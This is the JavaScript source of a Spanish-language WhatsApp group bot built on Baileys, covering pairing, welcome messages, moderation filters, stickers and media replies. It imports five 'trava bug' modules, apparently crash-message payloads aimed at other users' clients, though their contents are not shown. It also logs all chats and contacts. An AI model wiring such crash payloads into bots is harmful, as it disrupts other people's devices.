const { default : makeWASocket, DisconnectReason,useMultiFileAuthState,makeInMemoryStore,downloadContentFromMessage,jidDecode,proto,generateWAMessageFromContent,fetchLatestBaileysVersion,makeCacheableSignalKeyStore,PHONENUMBER_MCC,delay} = require('@whiskeysockets/baileys');
const { Boom } = require('@hapi/boom');
const P = require('pino');
const cfonts = require('cfonts');
const chalk = require("chalk");
const fs = require("fs");
const util = require('util');
 const request = require('request');
const PhoneNumber = require('awesome-phonenumber');
const moment = require('moment-timezone');
const axios = require('axios');
const ffmpeg = require("fluent-ffmpeg");
const speed = require('performance-now');
const { sizeFormatter } = require('human-readable')
const sortear = require('./archivos/juegos/sortear.js')
const formatp = sizeFormatter({
    std: 'JEDEC', //'SI' = default | 'IEC' | 'JEDEC'
    decimalPlaces: 2,
    keepTrailingZeroes: false,
    render: (literal, symbol) => `${literal} ${symbol}B`,
})
const { Aki } = require('aki-api')
const os = require('os')
const varping = speed()
const ping = speed() - varping
const timestamp = speed()
const latensi = speed() - timestamp
const { exec, spawn, execSync } = require("child_process");
const mimetype = require("mime-types");
const readline = require("readline");
const NodeCache = require("node-cache");
const FileType = require('file-type');
const {casinofacil,banderasok,dragonz,mundoZ,mundoNaruto,mundoone,diferenciastop,emojirefran,casinodificil} = require('./archivos/juegos/apijulsjuegos.js');
const akinator = JSON.parse(fs.readFileSync('./archivos/juegos/akinator.json'))
const cursodd = require('./archivos/curso.js');
const { anagramaok } = require('./archivos/juegos/apianagrama.js');
// exports .json
const duelitoss = fs.readFileSync('./archivos/fotos/duelo.jpg');
const welcomE = require('./archivos/fotos/welcome.json');
const fotomenu = require('./archivos/fotos/menu.json');
const { translate } = require('@vitalets/google-translate-api');
const githubstalk = require('./archivos/funciones/githubstalk');
const npmstalk = require('./archivos/funciones/npmstalk');
var intentos = 0
let fila, columna, sopaNube, sopaPalabra, sopaDir, userSP, cambioLetra = null
// JSON.parse
const welkom = JSON.parse(fs.readFileSync('./archivos/antis/welkom.json'));
const antilink = JSON.parse(fs.readFileSync('./archivos/antis/antilink.json'));
const antidoc = JSON.parse(fs.readFileSync('./archivos/antis/antidoc.json'));
const buscame = JSON.parse(fs.readFileSync('./archivos/fotos/menu.json'));
const audiosapi = JSON.parse(fs.readFileSync('./archivos/fotos/audios.json'));
const welcomnn = JSON.parse(fs.readFileSync('./archivos/fotos/welcome.json'));
const anticatalogo = JSON.parse(fs.readFileSync('./archivos/antis/anticatalogo.json'));
const antiflood = JSON.parse(fs.readFileSync('./archivos/antis/antiflood.json'));
const limitefll = JSON.parse(fs.readFileSync('./archivos/antis/flood.json'));
const muted = JSON.parse(fs.readFileSync('./archivos/juegos/muted.json'))
const antisticker = JSON.parse(fs.readFileSync('./archivos/antis/antisticker.json'))
const antiimg = JSON.parse(fs.readFileSync('./archivos/antis/antiimg.json'))
const antivid = JSON.parse(fs.readFileSync('./archivos/antis/antivideo.json'))
const antiloc = JSON.parse(fs.readFileSync('./archivos/antis/antiloc.json'))
const antictt = JSON.parse(fs.readFileSync('./archivos/antis/antictt.json'))
const antiaudio = JSON.parse(fs.readFileSync('./archivos/antis/antiaudio.json'))
const antinotas = JSON.parse(fs.readFileSync('./archivos/antis/antinotas.json'))
const autoreact = JSON.parse(fs.readFileSync('./archivos/antis/autoreact.json'))
const autosticker = JSON.parse(fs.readFileSync('./archivos/antis/autosticker.json'));
const { validmove, setGame } = require('./archivos/juegos/tictactoe');
const joguinhodavelhajs = JSON.parse(fs.readFileSync('./archivos/juegos/joguinhodavelha.json'));
const antifake = JSON.parse(fs.readFileSync('./archivos/antis/antifake.json'))
const joguinhodavelhajs2 = JSON.parse(fs.readFileSync('./archivos/juegos/joguinhodavelha2.json'));
// read database
let kuismath = []
// exports.js
const TelegraPh = require('./archivos/funciones/telegraPh.js')
const { xeontext1 } = require('./archivos/travas/trababug1.js')
const { xeontext2 } = require('./archivos/travas/trababug2.js')
const { xeontext3 } = require('./archivos/travas/trababug3.js')
const { xeontext4 } = require('./archivos/travas/trababug4.js')
const { xeontext5 } = require('./archivos/travas/trababug5.js')
const {videoToWebp,imageToWebp,writeExifImg,writeExifVid} = require('./archivos/funciones/stickersss.js');
const { getRandom,getGroupAdmins,getExtension } = require('./archivos/funciones/mixes.js');
const { numerodono,author } = require('./archivos/funciones/variables.js');
const prefixo = "/";
const { banner2 , banner3 } = require('./archivos/funciones/banner.js');
const color = require('./archivos/funciones/color.js');
const afk = require("./archivos/funciones/afk.js");
const _afk = JSON.parse(fs.readFileSync('./archivos/funciones/afk-user.json'))

const { fetchJson , getBuffer } = require('./archivos/funciones/gets.js')
const addExif = require('./archivos/funciones/webp_mp4')
const { addVotoDuelo, delVotoDuelo } = require('./archivos/votoduelo.js')
// databases
const menuS = "" + fotomenu[0].menuprincipal.imagen + "";
const audioS = "" + fotomenu[0].menuprincipal.audio + "";
const bienvenidaS = "" + welcomE[0].welcome.bienvenida + "";
const despedidaS = "" + welcomE[0].welcome.despedida + "";
const adminS = "" + welcomE[0].welcome.admin + "";
const noadminS = "" + welcomE[0].welcome.noadmin + "";
const nombreBott = "" + fotomenu[0].menuprincipal.nombrebot + "";
const pato = "" + audiosapi[0].audios.pato + "";
const kbro = "" + audiosapi[0].audios.kbro + "";
const ax = "" + audiosapi[0].audios.a + "";
const buendia = "" + audiosapi[0].audios.buendia + "";
//funciones
const renovarimagen = (imgoficial, imagennueva) => {
if (buscame[0].menuprincipal.imagen === imgoficial) {
buscame[0].menuprincipal.imagen = imagennueva
fs.writeFileSync('./archivos/fotos/menu.json', JSON.stringify(buscame))
}
}
const renovaraudio = (audiooficial, audionuevo) => {
if (buscame[0].menuprincipal.audio === audiooficial) {
buscame[0].menuprincipal.audio = audionuevo
fs.writeFileSync('./archivos/fotos/menu.json', JSON.stringify(buscame))
}
}
const renovarnombre = (imgoficial, imagennueva) => {
if (buscame[0].menuprincipal.nombrebot === imgoficial) {
buscame[0].menuprincipal.nombrebot = imagennueva
fs.writeFileSync('./archivos/fotos/menu.json', JSON.stringify(buscame))
}
}
const renovarbienvenida = (bienvenidaoficial, bienvenidanueva) => {
if (welcomnn[0].welcome.bienvenida === bienvenidaoficial) {
welcomnn[0].welcome.bienvenida = bienvenidanueva
fs.writeFileSync('./archivos/fotos/welcome.json', JSON.stringify(welcomnn))
}
}
const renovardespedida = (bienvenidaoficial, bienvenidanueva) => {
if (welcomnn[0].welcome.despedida === bienvenidaoficial) {
welcomnn[0].welcome.despedida = bienvenidanueva
fs.writeFileSync('./archivos/fotos/welcome.json', JSON.stringify(welcomnn))
}
}
const renovaradmin = (bienvenidaoficial, bienvenidanueva) => {
if (welcomnn[0].welcome.admin === bienvenidaoficial) {
welcomnn[0].welcome.admin = bienvenidanueva
fs.writeFileSync('./archivos/fotos/welcome.json', JSON.stringify(welcomnn))
}
}
const renovarnoadmin = (bienvenidaoficial, bienvenidanueva) => {
if (welcomnn[0].welcome.noadmin === bienvenidaoficial) {
welcomnn[0].welcome.noadmin = bienvenidanueva
fs.writeFileSync('./archivos/fotos/welcome.json', JSON.stringify(welcomnn))
}
}
//menu video
const videoMenu = fs.readFileSync('./archivos/menu.mp4')
// limite flood
const limitefl = limitefll.limitefl

// Conexión
async function connectToWhatsApp () {
			console.log(banner3.string)
		console.log(banner2.string)
			
const store = makeInMemoryStore({
    logger: P().child({
        level: 'silent',
        stream: 'store'
    })
})

let phoneNumber = "32460220392"
const pairingCode = !!phoneNumber || process.argv.includes("--pairing-code")
const useMobile = process.argv.includes("--mobile")

const rl = readline.createInterface({ input: process.stdin, output: process.stdout })
const question = (text) => new Promise((resolve) => rl.question(text, resolve))
let { version, isLatest } = await fetchLatestBaileysVersion()
const {  state, saveCreds } =await useMultiFileAuthState(`./qr-code`)
    const msgRetryCounterCache = new NodeCache() 
    const sock = makeWASocket({
        logger: P({ level: 'silent' }),
        printQRInTerminal: !pairingCode, 
      mobile: useMobile, 
      browser: ['Chrome (Linux)', '', ''], 
     auth: {
         creds: state.creds,
         keys: makeCacheableSignalKeyStore(state.keys, P({ level: "fatal" }).child({ level: "fatal" })),
      },
      browser: ['Chrome (Linux)', '', ''], 
      markOnlineOnConnect: true, 
      generateHighQualityLinkPreview: true, 
      getMessage: async (key) => {
         let jid = jidNormalizedUser(key.remoteJid)
         let msg = await store.loadMessage(jid, key.id)

         return msg?.message || ""
      },
      msgRetryCounterCache, 
      defaultQueryTimeoutMs: undefined, 
   })
   
   store.bind(sock.ev)

   if (pairingCode && !sock.authState.creds.registered) {
      if (useMobile) throw new Error('No se puede usar el código de emparejamiento con la API móvil')

      let phoneNumber
      if (!!phoneNumber) {
         phoneNumber = phoneNumber.replace(/[^0-9]/g, '')

         if (!Object.keys(PHONENUMBER_MCC).some(v => phoneNumber.startsWith(v))) {
            console.log(chalk.bgBlack(chalk.redBright("Comience con el código de país de su número de WhatsApp, Ejemplo: +32460220392")))
            process.exit(0)
         }
      } else {
         phoneNumber = await question(chalk.bgBlack(chalk.greenBright(`Escriba su número de WhatsApp \nPor ejemplo: +32460220392 : `)))
         phoneNumber = phoneNumber.replace(/[^0-9]/g, '')

         if (!Object.keys(PHONENUMBER_MCC).some(v => phoneNumber.startsWith(v))) {
            console.log(chalk.bgBlack(chalk.redBright("Comience con el código de país de su número de WhatsApp, Ejemplo: +32460220392")))

            phoneNumber = await question(chalk.bgBlack(chalk.greenBright(`Escriba su número de WhatsApp \nPor ejemplo: +32460220392 : `)))
            phoneNumber = phoneNumber.replace(/[^0-9]/g, '')
            rl.close()
         }
      }

      setTimeout(async () => {
         let code = await sock.requestPairingCode(phoneNumber)
         code = code?.match(/.{1,4}/g)?.join("-") || code
         console.log(chalk.black(chalk.bgGreen(`Su Código de Vinculación Es : `)), chalk.black(chalk.white(code)))
      }, 3000)
   }

sock.ev.on('connection.update', async (update) => {
	const {
		connection,
		lastDisconnect
	} = update
try{
		if (connection === 'close') {
			let reason = new Boom(lastDisconnect?.error)?.output.statusCode
			if (reason === DisconnectReason.badSession) {
				console.log(`Archivo de Sesión Incorrecto, Elimine la Sesión y Escanee Nuevamente`);
				connectToWhatsApp()
			} else if (reason === DisconnectReason.connectionClosed) {
				console.log("Conexión cerrada, reconectando....");
				connectToWhatsApp();
			} else if (reason === DisconnectReason.connectionLost) {
				console.log("Conexión perdida del servidor, reconectando...");
				connectToWhatsApp();
			} else if (reason === DisconnectReason.connectionReplaced) {
				console.log("Conexión Reemplazada, Se Abrió Otra Nueva Sesión, Cierre La Sesión Actual Primero");
				connectToWhatsApp()
			} else if (reason === DisconnectReason.loggedOut) {
				console.log(`Dispositivo Desconectado, Elimine la Sesión y Escanee Nuevamente.`);
				connectToWhatsApp();
			} else if (reason === DisconnectReason.restartRequired) {
				console.log("Se Requiere Reiniciar\nReiniciando...");
				connectToWhatsApp();
			} else if (reason === DisconnectReason.timedOut) {
				console.log("Tiempo de espera de conexión\nReconectando.");
				connectToWhatsApp();
			} else sock.end(`Motivo de desconexión desconocido: ${reason}|${connection}`)
		}
		if (update.connection == "connecting" || update.receivedPendingNotifications == "false") {
			console.log(color(`\n..📈..Conectando..`, 'yellow'))
		}
		if (update.connection == "open" || update.receivedPendingNotifications == "true") {
			console.log(color(` `,'magenta'))
            console.log(color(`💻 Conectado a => ` + JSON.stringify(sock.user, null, 2), 'yellow'))
			await delay(1999)

		}
	
} catch (err) {
	  console.log('Error in Connection.update '+err)
	  connectToWhatsApp();
	}
})
sock.ev.on('creds.update', saveCreds)         


sock.ev.on ('creds.update', saveCreds)   
 
 store.bind(sock.ev)

sock.ev.on('chats.set', () => {
    console.log('Team chats', store.chats.all())
})

sock.ev.on('contacts.set', () => {
    console.log('Team contactos', Object.values(store.contacts))
})

sock.sendText = (jid, text, quoted = '', options) => sock.sendMessage(jid, { text: text, ...options }, { quoted })


sock.decodeJid = (jid) => {
        if (!jid) return jid
        if (/:\d+@/gi.test(jid)) {
            let decode = jidDecode(jid) || {}
            return decode.user && decode.server && decode.user + '@' + decode.server || jid
        } else return jid
    }
    
sock.getName = (jid, withoutContact  = false) => {
        id = sock.decodeJid(jid)
        withoutContact = sock.withoutContact || withoutContact 
        let v
        if (id.endsWith("@g.us")) return new Promise(async (resolve) => {
            v = store.contacts[id] || {}
            if (!(v.name || v.subject)) v = sock.groupMetadata(id) || {}
            resolve(v.name || v.subject || PhoneNumber('+' + id.replace('@s.whatsapp.net', '')).getNumber('international'))
        })
        else v = id === '0@s.whatsapp.net' ? {
            id,
            name: 'WhatsApp'
        } : id === sock.decodeJid(sock.user.id) ?
            sock.user :
            (store.contacts[id] || {})
            return (withoutContact ? '' : v.name) || v.subject || v.verifiedName || PhoneNumber('+' + jid.replace('@s.whatsapp.net', '')).getNumber('international')
    }
// welcome completo 
sock.ev.on('group-participants.update', async (anu) => {
if(antifake.includes(anu.id)) {
if (anu.action === 'add' && !anu.participants[0].startsWith(51)){
num = anu.participants[0]
sock.groupParticipantsUpdate(anu.id, [anu.participants[0]], 'remove')
}
}

if(antifake.includes(anu.id)) {
if (anu.action === 'add' && !anu.participants[0].startsWith(52)){
num = anu.participants[0]
sock.groupParticipantsUpdate(anu.id, [anu.participants[0]], 'remove')
}
}

if(antifake.includes(anu.id)) {
if (anu.action === 'add' && !anu.participants[0].startsWith(54)){
num = anu.participants[0]
sock.groupParticipantsUpdate(anu.id, [anu.participants[0]], 'remove')
}
}

if(antifake.includes(anu.id)) {
if (anu.action === 'add' && !anu.participants[0].startsWith(57)){
num = anu.participants[0]
sock.groupParticipantsUpdate(anu.id, [anu.participants[0]], 'remove')
}
}

if(antifake.includes(anu.id)) {
if (anu.action === 'add' && !anu.participants[0].startsWith(59)){
num = anu.participants[0]
sock.groupParticipantsUpdate(anu.id, [anu.participants[0]], 'remove')
}
}


if(antifake.includes(anu.id)) {
if (anu.action === 'add' && !anu.participants[0].startsWith(50)) {
num = anu.participants[0]
sock.groupParticipantsUpdate(anu.id, [anu.participants[0]], 'remove')
}
}

if(antifake.includes(anu.id)) {
if (anu.action === 'add' && !anu.participants[0].startsWith(53)){
num = anu.participants[0]
sock.groupParticipantsUpdate(anu.id, [anu.participants[0]], 'remove')
}
}

if(antifake.includes(anu.id)) {
if (anu.action === 'add' && !anu.participants[0].startsWith(55)){
num = anu.participants[0]
sock.groupParticipantsUpdate(anu.id, [anu.participants[0]], 'remove')
}
}

if(antifake.includes(anu.id)) {
if (anu.action === 'add' && !anu.participants[0].startsWith(56)){
num = anu.participants[0]
sock.groupParticipantsUpdate(anu.id, [anu.participants[0]], 'remove')
}
}

if(antifake.includes(anu.id)) {
if (anu.action === 'add' && !anu.participants[0].startsWith(58)){
num = anu.participants[0]
sock.groupParticipantsUpdate(anu.id, [anu.participants[0]], 'remove')
}
}
        //console.log(anu)
        if (welkom.includes(anu.id)) {
            try {
                metadata = await sock.groupMetadata(anu.id)
                participants = anu.participants
                               memb = metadata.participants.length
                for (let num of participants) {
                                            me = num
                                    nama = await sock.getName(num)                                    
const lokilloo = `
╭═⊷━━ @${me.split('@')[0]}━━➪
||| 𝑩𝑰𝑬𝑵𝑽𝑬𝑵𝑰𝑫𝑶 𝑨𝑳 𝑮𝑹𝑼𝑷𝑶
╰═⊷━━━━━━━━━━━━╯
 ${bienvenidaS} 
╰━━━━━⚊✬✥✬━━━━━➪
`
const lokilloo2 = `
╭═⊷━━━𝐆𝐎𝐎𝐃 𝐁𝐀𝐘━━━━➪
╰═⊷━@${me.split('@')[0]}━➪╮
 ${despedidaS}
╰━━━━━━⚊✬✥✬━━━━━➪
`
                    try {
                        ppuser = await sock.profilePictureUrl(num, 'image')
                    } catch {
ppuser = "https://i.postimg.cc/R067fWJK/images-5.jpg"
                    }     
                    
                    if (anu.action == 'add') {
                                        fotowelc = await getBuffer(`https://api.akuari.my.id/canvas/welcome?name=${encodeURIComponent(nama)}&gcname=${metadata.subject}&ppgc=${encodeURIComponent(ppuser)}&member=${memb}&pp=${encodeURIComponent(ppuser)}&bg=${encodeURIComponent(ppuser)}`)                                           
sock.sendMessage(anu.id,
 { image: fotowelc ,caption : lokilloo,contextInfo:{
mentionedJid:[me,nama],
}})
                                       
                    } else if (anu.action == 'remove') {
                    fotodess = await getBuffer(`https://api.akuari.my.id/canvas/goodbye?name=${encodeURIComponent(nama)}&gcname=${encodeURIComponent(metadata.subject)}&ppgc=${encodeURIComponent(ppuser)}&member=${encodeURIComponent(memb)}&pp=${encodeURIComponent(ppuser)}&bg=${encodeURIComponent(ppuser)}`)
                                                        
sock.sendMessage(anu.id,
 { image: fotodess ,caption : lokilloo2,contextInfo:{
mentionedJid:[me, nama],
}})         
                    } else if (anu.action == 'promote') {
              nooopp = adminS
sock.sendMessage(anu.id,
 { text: nooopp,
 contextInfo:{
 mentionedJid:[num],
 "externalAdReply": {"showAdAttribution": true,
 "containsAutoReply": true,
 "title": `[❗️]𝐅𝐄𝐋𝐈𝐂𝐈𝐃𝐀𝐃𝐄𝐒 ${nama}`,
"body": `Somos el Mejor bot de cases`,
 "previewType": "PHOTO",
"thumbnailUrl": ppuser,
"thumbnail": "",
"sourceUrl": `https://chat.whatsapp.com/CaFiUc8xvE1220ZChq4iRr`}}})                           
                } else if (anu.action == 'demote') {
                nooopp = noadminS       
sock.sendMessage(anu.id,
 { text: nooopp,
 contextInfo:{
 mentionedJid:[num],
 "externalAdReply": {"showAdAttribution": true,
 "containsAutoReply": true,
 "title": `[❗️]𝐋𝐎 𝐒𝐈𝐄𝐍𝐓𝐎 ${nama}`,
"body": `Somos el Mejor bot de cases`,
 "previewType": "PHOTO",
"thumbnailUrl": ppuser,
"thumbnail": "",
"sourceUrl": `https://chat.whatsapp.com/CaFiUc8xvE1220ZChq4iRr`}}})                                 
                    }
                                        
                }
            } catch (err) {
                console.log(err)
            }
        }
    })    
    //
 sock.ev.on('messages.upsert', async m => {
 try {
 const info = m.messages[0]
 if (!info.message) return 
 if (info.key && info.key.remoteJid == "status@broadcast") return
 const altpdf = Object.keys(info.message)
 const type = altpdf[0] == "senderKeyDistributionMessage" ? altpdf[1] == "messageContextInfo" ? altpdf[2] : altpdf[1] : altpdf[0]
const content = JSON.stringify(info.message)
const from = info.key.remoteJid
 var body = (type === 'conversation') ? info.message.conversation : (type == 'imageMessage') ? info.message.imageMessage.caption : (type == 'videoMessage') ? info.message.videoMessage.caption : (type == 'extendedTextMessage') ? info.message.extendedTextMessage.text : (type == 'buttonsResponseMessage') ? info.message.buttonsResponseMessage.selectedButtonId : (type == 'listResponseMessage') ? info.message.listResponseMessage.singleSelectReply.selectedRowId : (type == 'templateButtonReplyMessage') ? info.message.templateButtonReplyMessage.selectedId : ''
const budy = (type === 'conversation') ? info.message.conversation : (type === 'extendedTextMessage') ? info.message.extendedTextMessage.text : ''
var pes = (type === 'conversation' && info.message.conversation) ? info.message.conversation : (type == 'imageMessage') && info.message.imageMessage.caption ? info.message.imageMessage.caption : (type == 'videoMessage') && info.message.videoMessage.caption ? info.message.videoMessage.caption : (type == 'extendedTextMessage') && info.message.extendedTextMessage.text ? info.message.extendedTextMessage.text : ''
// CONSTANTES IS  
 const isGroup = info.key.remoteJid.endsWith('@g.us')
const sender = isGroup ? info.key.participant : info.key.remoteJid
const groupMetadata = isGroup ? await sock.groupMetadata(from) : ''
const groupName = isGroup ? groupMetadata.subject : ''
const groupDesc = isGroup ? groupMetadata.desc : ''
const groupMembers = isGroup ? groupMetadata.participants : ''
const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''
const groupId = isGroup ? groupMetadata.id : ''
const nome = info.pushName ? info.pushName : ''
const messagesC = pes.slice(0).trim().split(/ +/).shift().toLowerCase()
const args = body.trim().split(/ +/).slice(1)
const argss = body.split(/ +/g)
const q = args.join(' ')
const text = args.join(' ')
const removeAccents = (str) => str.normalize("NFD").replace(/[\u0300-\u036f]/g, "");
const isCmd = body.startsWith(prefixo)
const comando = isCmd ? body.slice(1).trim().split(/ +/).shift().toLocaleLowerCase() : null 
const mentions = (teks, memberr, id) => {
(id == null || id == undefined || id == false) ? sock.sendMessage(from, {text: teks.trim(), mentions: memberr}) : sock.sendMessage(from, {text: teks.trim(), mentions: memberr})}
const quoted = info.quoted ? info.quoted : info
const mime = (quoted.info || quoted).Mimetype || ""
const sleep = async (ms) => {return new Promise(resolve => setTimeout(resolve, ms))}
const pushname = info.pushName ? info.pushName : ''
const isBot = info.key.fromMe ? true : false
const isOwner = sender.includes(numerodono)
const BotNumber = sock.user.id.split(':')[0]+'@s.whatsapp.net'
const isGroupAdmins = groupAdmins.includes(sender) || false 
const isBotGroupAdmins = groupAdmins.includes(BotNumber) || false
const isUrl = (url) => { return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%._+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_+.~#?&/=]*)/, 'gi')) }
const deviceType = info.key.id.length > 21 ? 'Android' : info.key.id.substring(0, 2) == '3A' ? 'IPhone' : 'WhatsApp web'
const options = { timeZone: 'America/Lima', hour12: false }
const data = moment.tz('America/Lima').format('DD/MM/YY');
const hora = moment.tz('America/Lima').format('HH:mm:ss');
// is nuevas
const isWelkom = isGroup ? welkom.includes(from) : false 
const isAntiLink = isGroup ? antilink.includes(from) : false
const isAnticatalogo = isGroup ? anticatalogo.includes(from) : false
const Antidoc = isGroup ? antidoc.includes(from) : false
const isAntiFlood = isGroup ? antiflood.includes(from) : false
const isAntiSticker = isGroup ? antisticker.includes(from) : false
const isAntiImg = isGroup ? antiimg.includes(from) : false
const isAntiVid = isGroup ? antivid.includes(from) : false	
const Antiloc = isGroup ? antiloc.includes(from) : false
const isAntiCtt = isGroup ? antictt.includes(from) : false
const isAntiAudio = isGroup ? antiaudio.includes(from) : false	
const isAntiNotas = isGroup ? antinotas.includes(from) : false
const isAutoReact = isGroup ? autoreact.includes(from) : false
const isAutoSticker = isGroup ? autosticker.includes(from) : false
 const isJoguin = isGroup ? joguinhodavelhajs.includes(sender) : false
 const isAntifake = isGroup ? antifake.includes(from) : false
 const isAfkOn = afk.checkAfkUser(sender, _afk)
// funciones Nuevas
const GroupsMutedActived = []
            for(let obj of muted) {
                GroupsMutedActived.push(obj.jid)
            }
            const isMuted = (isGroup && GroupsMutedActived.indexOf(from) >= 0) ? true : false
            const NumbersMuted = isMuted ? muted[GroupsMutedActived.indexOf(from)].numbers : []
            if(isMuted && NumbersMuted.indexOf(sender) >= 0){
                sock.groupParticipantsUpdate(from,[sender], 'remove')                
                }
                
   sock.downloadMediaMessage = async (message) => {
        let mime = (message.msg || message).mimetype || ''
        let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0]
        const stream = await downloadContentFromMessage(message, messageType)
        let buffer = Buffer.from([])
        for await(const chunk of stream) {
            buffer = Buffer.concat([buffer, chunk])
	}        
	return buffer
     }   
const enviarfiguvid = async (jid, path, quoted, options = {}) => {
let buff = Buffer.isBuffer(path) ? path: /^data:.*?\/.*?;base64,/i.test(path) ? Buffer.from(path.split`,`[1], 'base64'): /^https?:\/\//.test(path) ? await (await getBuffer(path)): fs.existsSync(path) ? fs.readFileSync(path): Buffer.alloc(0)
let buffer
if (options && (options.packname || options.author)) {
 buffer = await writeExifVid(buff, options)
} else {
 buffer = await videoToWebp(buff)
}
await sock.sendMessage(jid, {
 sticker: {
url: buffer
 }, ...options
}, {
 quoted
})
return buffer
 }
 function isDoubleByte(str) {
for (let i = 0, n = str.length; i < n; i++) {
if (str.charCodeAt(i) > 255) {
return true;
}
}
return false;
}
const enviarfiguimg = async (jid, path, quoted, options = {}) => {
let buff = Buffer.isBuffer(path) ? path: /^data:.*?\/.*?;base64,/i.test(path) ? Buffer.from(path.split`,`[1], 'base64'): /^https?:\/\//.test(path) ? await (await getBuffer(path)): fs.existsSync(path) ? fs.readFileSync(path): Buffer.alloc(0)
let buffer
if (options && (options.packname || options.author)) {
 buffer = await writeExifImg(buff, options)
} else {
 buffer = await imageToWebp(buff)
}
await sock.sendMessage(jid, {
 sticker: {
url: buffer
 }, ...options
}, {
 quoted
})
return buffer
 }
sock.downloadAndSaveMediaMessage = async (message, filename, attachExtension = true) => {
let quoted = message.msg ? message.msg : message
let mime = (message.msg || message).mimetype || ''
let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0]
const stream = await downloadContentFromMessage(quoted, messageType)
let buffer = Buffer.from([])
for await(const chunk of stream) {
buffer = Buffer.concat([buffer, chunk])
}
let type = await FileType.fromBuffer(buffer)
trueFileName = attachExtension ? (filename + '.' + type.ext) : filename
await fs.writeFileSync(trueFileName, buffer)
return trueFileName
}
 // CONSTANTES NUEVAS 
 const enviar = (texto) => {
 sock.sendMessage(from,{ text : texto }, {quoted : info})
 }
const enviarfoto = (imagen,texto) => {
 sock.sendMessage(from,{ image : imagen, caption : texto }, {quoted : info})
 } 
 const enviarfoto2 = (imagen,texto) => {
 sock.sendMessage(from,{ image : { url : imagen}, caption : texto }, {quoted : info})
 } 
const enviarVideitos = (video,caption) => {
 sock.sendMessage(from,{ video : video, caption : caption , gifPlayback: true} ,{ quoted : info})
 }
const enviarmusica = (musica,titulo,descripcion,imagen) => {
 sock.sendMessage(from, { audio : { url : musica } ,
                     mimetype: 'audio/mp4',
                     ptt: true,contextInfo: {
externalAdReply: {
title: titulo,
body: descripcion,
thumbnailUrl: imagen, 
mediaType: 1,
showAdAttribution: true,
renderLargerThumbnail: true
}}})
 }  
const enviarvideo = (imagen,texto) => {
 sock.sendMessage(from,{ video : { url : imagen}, caption : texto, mimetype: 'video/mp4'}, {quoted : info})
 } 
const enviarsticker = (sticker) => {
sock.sendMessage(from, {
 sticker: sticker
}, { quoted : info})
}

const mencionar = ( foto, texto, membro, ids ) => {
( ids == null || ids == undefined || ids == false ) ? sock.sendMessage(from, { image: foto, caption: texto.trim(), contextInfo: { "mentionedJid": membro } }) : sock.sendMessage(from, { image: foto, caption: texto.trim(), contextInfo: { "mentionedJid": membro } })
}
 const totalFitur = () =>{
            var mytext = fs.readFileSync("./index.js").toString()
            var numUpper = (mytext.match(/case '/g) || []).length;
            return numUpper
        }

 const respuesta = {
 espere : ` [⏳️] *Cargando* ... `,
 dono : ` [ ❗️] *Lo siento mucho ${pushname}, pero este comando es usado solo por mi creador*`,
 premiun: ` [ ❗️] *Querido amig@ ${pushname} compre la version premiun*`,
 grupos : ` [ ❗️] *Lo siento mucho ${pushname}, pero este comando es usado solo para grupos*`,
 privado : ` [ ❗️] *Lo siento mucho ${pushname}, pero este comando es usado solo para chats privados*`,
 error : ` [ ❗️] *Lo siento mucho ${pushname}, pero su pedido ha sido rechazado, intentelo Nuevamente o comuniquese con mi creador*`,
 textito : ` [ ❗️] *Lo siento mucho ${pushname} , pero debes digitar un texto, caso contrario ignorare este mensaje, ejemplo : ${comando} textoaqui* `,
 linkii : ` [ ❗️] *Lo siento mucho ${pushname}, pero debes pegar un link, caso contrario ignorare este mensaje, ejemplo : ${comando} https://telegra.ph/file/2c104b8eaa7ce3847f687.jpg*`,
          admin : ` [ ❗️] *Lo siento mucho ${pushname}, pero este comando es usado solo para administradores*`,
 botadmin : ` [ ❗️] *Lo siento mucho ${pushname},pero el bot en estos momentos no es administrador*`,
 activos : `[❌️] * Lo siento mucho ${pushname} pero ${comando} Ya está activado* `,
 desactivos :`[❌️] * Lo siento mucho ${pushname} pero ${comando} Ya está desactivado* `,
 onactivo : `[❗️] *Nuestro querido administrador: ${pushname} hactivado ${comando}, tengan cuidado de lo contrario serán baneados automaticamente* `,
 offactivo :`[❗️] *Ufff Gracias ${pushname} ,${comando} ha sido Desactivado, pueden enviar cualquier cosa , sin ningún problema* `,
 correctamente : `[❌️] * Lo siento mucho ${pushname} pero debes digitar ${comando} 1 o ${comando} 0 , de lo contrario no te haré caso* `,
 remarcaimg : `[❌️] * Lo siento mucho ${pushname} pero debe remarcar una imagen* `,
 remarcasticker : `[❌️] * Lo siento mucho ${pushname} pero debe remarcar un sticker* `,
 pedido : `[🍿 ] *${pushname}* , *Gracias Por usar MiniJulscito*\n[🎁] *Estamos trabajando cada dia para poder ofrecerte un trabajo de calidad y un mejor servicio*\n[🕹]  *Suscribete a nuestro canal de Youtube* : https://youtube.com/@guedelinnovation?si=TlW1qSzYTnc1KolH\n[💣] *Contamos con nuestra propia Api rest* : https://minijulscitoapi.store/ \n[🤖] *Tambien tenemos nuestro Propio bot en telegram* : https://t.me/minijulscitobot\n\n[📓] *Siempre demostrando Porque se nos considera uno de los mejores creadores de bots estilo cases*`,
 fotolink : `[❗️] *${pushname} Envia una foto y remarcala con el comando linkimg* `,
 audiolink : `[❗️] *${pushname} Envia un audio y remarcala con el comando linkaudio* `,
 fotolink2 : `[❗️] *${pushname} Envia una foto y remarcala con el comando linkimg y luego con ese link digita el comando nuevamente, ejemplo : ${comando} https://telegra.ph/file/2c104b8eaa7ce3847f687.jpg* `,
 videolink : `[❗️] *${pushname} Envia un video y remarcalo con el comando linkvideo* `,
 reiniciar : `[❗️] ${pushname} *su pedido ha sido aprobado exitosamente, voy a reiniciar el bot de forma automatica para poder observar los cambios* `
 } 
 // CONSTANTES IFF 
 const isImage = type == "imageMessage"
const isVideo = type == "videoMessage"
const isAudio = type == "audioMessage"
const isSticker = type == "stickerMessage"
const isContact = type == "contactMessage"
const isLocation = type == "locationMessage"
const isProduct = type == "productMessage"
const isMedia = (type === "imageMessage" || type === "videoMessage" || type === "audioMessage") 
typeMessage = body.substr(0, 50).replace(/\n/g, "")
if (isImage) typeMessage = "Image"
else if (isVideo) typeMessage = "Video"
else if (isAudio) typeMessage = "Audio"
else if (isSticker) typeMessage = "Sticker"
else if (isContact) typeMessage = "Contact"
else if (isLocation) typeMessage = "Location"
else if (isProduct) typeMessage = "Product"
